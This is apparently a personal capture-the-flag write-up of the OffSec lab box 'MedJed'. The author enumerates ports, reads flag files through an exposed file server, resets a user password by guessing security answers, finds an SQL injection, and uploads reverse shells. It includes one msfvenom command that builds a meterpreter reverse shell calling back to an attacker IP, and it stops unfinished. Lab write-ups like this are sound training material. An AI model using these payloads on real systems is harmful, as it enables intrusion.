# MedJed

So i start off scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

On the web server i have a "Set admin account" page where i can create creds:

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

I continue and see a web file server part where i have read - write access so i'll try to upload some malicious stuff here (btw i am able to go and read the local.txt in the desktop located at:

```
http://192.168.57.127:8000/fs/C/Users/Jerren/Desktop/local.txt
```

i tried just to see how an error would occure to go and read proof.txt and it worked?

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

yeah i'll have offsec mentality and try to go further than that because this box is trash if left like that...

So i try to upload a reverse shell and a webshell to the admin directory but i can't trigger them for the moment:

<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

So i continue my enumeration, after doing a harder nmap i found these ports:

```
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
8000/tcp  open  http-alt     syn-ack ttl 127
30021/tcp open  unknown      syn-ack ttl 127
33033/tcp open  unknown      syn-ack ttl 127
44330/tcp open  unknown      syn-ack ttl 127
45332/tcp open  unknown      syn-ack ttl 127
45443/tcp open  unknown      syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

i went though all of them and found this on port 33033:

<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

This part is a bit guessy to my POV but hey whatever, i tried using the little sentence as keywords to restet the password of each users and ended up succeeding with the cat user and 'paranoid', before that i tested:

evren.eager -> impossible -> opinion // joe.webb -> vision -> process // etc...

<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption><p>jerren.devops:test123</p></figcaption></figure>

in their edit user thingy there is a upload avatar feature:

<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

So i upload a reverse shell but still it does not trigger anything:

<figure><img src="../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

and on the footer of the page there is a link to an endpoint that is called slug ->

<figure><img src="../../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.exploit-db.com/exploits/47205" %}

i end up seing exploits related to SQLi so maybe this is connected to the mysql instance on port 3306? and i manage to break the page by just injecting a quote:

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

I tried enumerating for tables or passwords but nope, going on to port 45332:

<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

for a broken box this is starting to piss me off, after fuzzing this trash quiz app i end up on this endpoint:

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Since php is running in this directory i tried doing an LFI to go and hit in C/Users/Administrator/Desktop/reverseshell.php but no good, so i try to find the directory of the php info and try to upload my reverse shell there ->

```
C:/xampp/htdocs/phpinfo.php 
```

<figure><img src="../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

So i upload the reverse shell and manage to make a ping back but no persistent connection:

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

bruh i tried plenty of revshells so i started to crash out then i hopped on revshells.com, went to windows and decided to launch msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.57 LPORT=1234 -f exe -o reverse.exe
```

still does not work hell nah

<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption><p>will come back after eating </p></figcaption></figure>
